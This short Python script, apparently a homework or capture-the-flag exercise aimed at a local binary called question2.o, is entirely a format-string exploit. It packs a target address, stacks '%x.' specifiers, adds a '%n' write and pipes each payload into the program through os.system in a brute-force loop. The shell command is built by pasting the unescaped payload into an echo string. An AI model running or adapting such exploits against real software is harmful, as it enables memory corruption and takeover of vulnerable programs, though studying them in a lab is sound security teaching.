import struct
import os
i = 0
while i < 1000:
    exploit = ""
    exploit += struct.pack("I", 0x0804a02c)
    exploit += "%x." * 10 * i
    exploit += "%"+str(i)+"x"
    exploit += "%n."
    os.system("echo " + exploit + "| ./question2.o")
    print("\n")
    i = i + 1
print("DONE!!")
